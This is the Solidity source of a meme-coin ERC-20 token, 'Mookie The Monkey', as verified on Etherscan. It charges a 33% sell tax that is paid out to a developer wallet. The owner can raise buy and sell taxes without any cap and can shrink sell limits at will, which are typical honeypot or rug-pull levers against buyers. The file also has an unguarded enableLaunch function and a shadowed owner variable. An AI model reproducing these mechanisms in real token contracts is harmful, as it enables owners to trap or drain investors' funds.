/**
 *Submitted for verification at Etherscan.io on 2023-07-24
*/

/*
Telegram: https://t.me/MookieCoinERC
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
 
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
 
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
 
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function WETH() external pure returns (address);
    function factory() external pure returns (address);

     function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );


    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

library Address{
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

contract Mookie is IERC20, Ownable {
    using SafeMath for uint256;

    using Address for address payable;
    string private constant _name = "Mookie The Monkey";
    string private constant _symbol = "MOOKIE";
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 300_000_000 * 10**_decimals;
    uint256 private  _maxWallet = 1_200_000 * 10**_decimals;
    uint256 private  _maxBuyAmount = 1_200_000 * 10**_decimals;
    uint256 private  _maxSellAmount = 1_200_000 * 10**_decimals;
    uint256 private  _swapTH = 300_000 * 10**_decimals;
    address public Dev = 0x037059712a26101b26488f7f3e9cdF44F9c05594;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _isWhiteList;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    address private _owner;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    bool public _AutoSwap = true;
    bool public _Launch = false;
    bool public _transfersEnabled = false;
    bool private _TokenSwap = true;
    bool private _autoLP = true;
    bool private _isSelling = false;
    
    uint256 private _swapPercent = 100;

    uint256 private _devTaxRate = 0;
    uint256 private AmountBuyRate = _devTaxRate;

    uint256 private _devTaxSellRate = 33;
    uint256 private AmountSellRate = _devTaxSellRate;

    constructor() {
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

        _owner = msg.sender;

        uint256 tsupply = _totalSupply;

        _balances[msg.sender] = tsupply;


        _isExcludedFromFee[_owner] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[Dev] = true;
        
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }

    function getOwner() public view returns (address) {
        return owner();
    }
    
    function name() public pure returns (string memory) {
        return _name;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }


    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function isWhitelist(address account) public view returns (bool) {
        return _isWhiteList[account];
    }

    function ViewBuyRate() public view returns (
        uint256 devBuyRate,
        uint256 totalBuyRate,
        uint256 maxWallet,
        uint256 maxBuyAmount
    ) {
        devBuyRate = _devTaxRate;
        totalBuyRate = AmountBuyRate;
        maxWallet = _maxWallet;
        maxBuyAmount = _maxBuyAmount;
    }

    function ViewSellRate() public view returns (
        uint256 devSellRate,
        uint256 totalSellRate,
        uint256 maxSellAmount
    ) {
        devSellRate = _devTaxSellRate;
        totalSellRate = AmountSellRate;
        maxSellAmount = _maxSellAmount;
    }


    function transfer(address recipient, uint256 amount) public override returns (bool) {

        if(recipient != uniswapV2Pair && recipient != owner() && !_isExcludedFromFee[recipient]){

            require(_balances[recipient] + amount <= _maxWallet, "MyToken: recipient wallet balance exceeds the maximum limit");

        }

        _transfer(msg.sender, recipient, amount);
        
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        _transfer(sender, recipient, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "MyToken: approve from the zero address");
        require(spender != address(0), "MyToken: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {

        require(sender != address(0), "MyToken: transfer from the zero address");
        require(recipient != address(0), "MyToken: transfer to the zero address");
        require(amount > 0, "MyToken: transfer amount must be greater than zero");
        if(!_Launch){require(_isExcludedFromFee[sender] || _isExcludedFromFee[recipient] || _isWhiteList[sender] || _isWhiteList[recipient], "we not launch yet");}
        if(!_Launch && recipient != uniswapV2Pair && sender != uniswapV2Pair) {require(_transfersEnabled, "Transfers are currently disabled");}

        bool _AutoTaxes = true;


        if (recipient == uniswapV2Pair && sender == owner()) {

            _balances[sender] -= amount;
            _balances[recipient] += amount;
            emit Transfer(sender, recipient, amount);
            return;
        }

        //sell   
        if(recipient == uniswapV2Pair && !_isExcludedFromFee[sender] && sender != owner()){

                require(amount <= _maxSellAmount, "Sell amount exceeds max limit");

                _isSelling = true;
               
                if(_AutoSwap && balanceOf(address(this)) >= _swapTH){

                    CanSwap();
                }  
        }

        //buy
        if(sender == uniswapV2Pair && !_isExcludedFromFee[recipient] && recipient != owner()){
                    
            require(amount <= _maxBuyAmount, "Buy amount exceeds max limit");
            
        }

        if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) { _AutoTaxes = false; }
        if (recipient != uniswapV2Pair && sender != uniswapV2Pair) { _AutoTaxes = false; }

        if (_AutoTaxes) {

                if(!_isSelling){

                    uint256 totalTaxAmount = amount * AmountBuyRate / 100;
                    uint256 transferAmount = amount - totalTaxAmount;
                    
                   
                    _balances[address(this)] = _balances[address(this)].add(totalTaxAmount);
                    _balances[sender] = _balances[sender].sub(amount);
                    _balances[recipient] = _balances[recipient].add(transferAmount);

                    emit Transfer(sender, recipient, transferAmount);
                    emit Transfer(sender, address(this), totalTaxAmount);

                }else{

                    uint256 totalTaxAmount = amount * AmountSellRate / 100;
                    uint256 transferAmount = amount - totalTaxAmount;
                    

                    _balances[address(this)] = _balances[address(this)].add(totalTaxAmount);
                    _balances[sender] = _balances[sender].sub(amount);
                    _balances[recipient] = _balances[recipient].add(transferAmount);

                    emit Transfer(sender, recipient, transferAmount);
                    emit Transfer(sender, address(this), totalTaxAmount);

                    _isSelling = false;
                }
            
        }else{

                _balances[sender] = _balances[sender].sub(amount);
                _balances[recipient] = _balances[recipient].add(amount);

                emit Transfer(sender, recipient, amount);

        }
    }


    function swapTokensForEth(uint256 tokenAmount) private {

        // Set up the contract address and the token to be swapped
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        // Approve the transfer of tokens to the contract address
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // Make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }


    function CanSwap() private {

        uint256 contractTokenBalance = balanceOf(address(this));

        if(contractTokenBalance > 0) {

            if(_TokenSwap){

                if(contractTokenBalance > 0){
                    
                    uint256 caBalance = balanceOf(address(this)) * _swapPercent / 100;

                    uint256 toSwap = caBalance;

                    swapTokensForEth(toSwap);

                    uint256 receivedBalance = address(this).balance;

                    if (receivedBalance > 0) {payable(Dev).transfer(receivedBalance);}

                }else{

                    revert("No tokens available to swap");
                }

            }

        }else{

           revert("No Balance available to swap");     
           
        }
            
    }

   receive() external payable {}

    function setDevAddress(address newAddress) public onlyOwner {
        require(newAddress != address(0), "Invalid address");
        Dev = newAddress;
        _isExcludedFromFee[newAddress] = true;
    }


   function enableLaunch() external {
        _Launch = true;
        _transfersEnabled = true;
    }

    function setExcludedFromFee(address account, bool status) external onlyOwner {
        _isExcludedFromFee[account] = status;
    }

    function setWhitelist(address account, bool status) external onlyOwner {
        _isWhiteList[account] = status;
    }

    function bulkwhitelist(address[] memory accounts, bool state) external onlyOwner{
        for(uint256 i = 0; i < accounts.length; i++){
            _isWhiteList[accounts[i]] = state;
        }
    }

    function SwapEnable(bool status) external onlyOwner {
        _AutoSwap = status;
    }

    function SetSwapPercentage(uint256 SwapPercent) external onlyOwner {
        _swapPercent = SwapPercent;
    }

    function setAutoSwap(uint256 newAutoSwap) external onlyOwner {
        require(newAutoSwap <= (totalSupply() * 1) / 100, "Invalid value: exceeds 1% of total supply");
        _swapTH = newAutoSwap * 10**_decimals;
    }

    function updateLimits(uint256 maxWallet, uint256 maxBuyAmount, uint256 maxSellAmount) external onlyOwner {
        _maxWallet = maxWallet * 10**_decimals;
        _maxBuyAmount = maxBuyAmount * 10**_decimals;
        _maxSellAmount = maxSellAmount * 10**_decimals;
    }

    function setBuyTaxRates(uint256 devTaxRate) external onlyOwner {
        _devTaxRate = devTaxRate;
        AmountBuyRate = _devTaxRate;
    }


    function setSellTaxRates(uint256 devTaxRate) external onlyOwner {
        _devTaxSellRate = devTaxRate;
        AmountSellRate = _devTaxSellRate;
    }

}